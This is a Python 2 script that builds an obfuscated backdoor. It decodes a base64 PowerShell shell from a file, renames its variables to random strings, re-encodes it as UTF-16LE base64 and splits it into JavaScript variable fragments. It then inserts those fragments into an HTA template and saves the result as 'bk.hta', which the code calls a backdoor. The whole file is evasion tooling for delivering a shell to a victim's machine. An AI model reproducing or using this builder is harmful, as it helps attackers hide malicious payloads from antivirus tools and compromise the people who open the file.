import textwrap
import base64
import random
import string 
import time
saveShellWithNull = open("shellWithNull", "w")

def decodbs64():
   filename = "Base64"
   shell = open(filename, "r")
   ReadShell=shell.read()
   getFileWithoutNull=base64.b64decode(ReadShell).replace("\00", "")
   obfASW(getFileWithoutNull)

def wrap(s, w):
    filename = "fragFile"
    fragFile = open(filename, "w")
    fragFile.write(textwrap.fill(s, w))

def obfASW(getFileWithoutNullT):
   time.sleep(2)
   randomNumber=random.randint(1,60)
   genStrOne=''.join(random.choice(string.ascii_letters) for x in range(randomNumber))
   roundNone=getFileWithoutNullT.replace("$b", "$"+genStrOne)
   randomNumber2=random.randint(1,40)
   genStrTwo=''.join(random.choice(string.ascii_letters) for x in range(randomNumber2))
   roundNTwo=roundNone.replace("$s", "$"+genStrTwo)
   randomNumber3=random.randint(1,39)
   genStrThree=''.join(random.choice(string.ascii_letters) for x in range(randomNumber3))
   roundNThree=roundNTwo.replace("$p", "$"+genStrThree)
   retrunNulls(roundNThree)

def retrunNulls(roundNThreeT):

   shellWithNull=u"{}".format(roundNThreeT).encode('utf-16le')
   shellReady=base64.b64encode(shellWithNull)
   saveShellWithNull.write(shellReady)
   wrap(shellReady,10)
   time.sleep(4)
   buildFrag()

def buildFrag():
   count=0
   var0=""
   buildFrag = open("buildFrag", "w")

   with open('fragFile') as f:
      for line in f:
          if count != 0 :
             buildFrag.write("var{}".format(count)+"="+"var{}".format(count-1)+"+"+"'"+line.strip('\n')+"'"+";")
          else:
             buildFrag.write("var{}".format(count)+"="+"'"+line.strip('\n')+"'"+";")
          count=count+1
          var0=line
   time.sleep(10)
   ProcessCompleted(count)

def ProcessCompleted(count):
   replaceHta = open("htafile.hta", "r")
   readHta=replaceHta.read()
  
   

   randomNumberV=random.randint(3,42)
   genVarOne=''.join(random.choice(string.ascii_letters) for x in range(randomNumberV))

   roundNOneV=readHta.replace("one", genVarOne)
   roundNTwoV=roundNOneV.replace("Two", genVarOne)

   time.sleep(5)
   
   roundNThreeVG=roundNTwoV.replace("Go0Gole","var{}".format(count-1))

   randomNumberZ=random.randint(5,19)
   genVarZero=''.join(random.choice(string.ascii_letters) for x in range(randomNumberZ))
 
   roundNZeroV=roundNThreeVG.replace("zeroo",genVarZero)
 
   randomNumberStep=random.randint(5,15)
   genVarOneStep=''.join(random.choice(string.ascii_letters) for x in range(randomNumberV))
   roundNOneS=roundNZeroV.replace("SRpT", genVarOneStep)


   randomNumberStep=random.randint(1,9)
   genVarOneStep2=''.join(random.choice(string.ascii_letters) for x in range(randomNumberV))

   roundNOneS2=roundNOneS.replace("steUyo", genVarOneStep2)
   saveBackDoOr = open("bk.hta", "w")
   saveBackDoOr.write(roundNOneS2)

decodbs64()
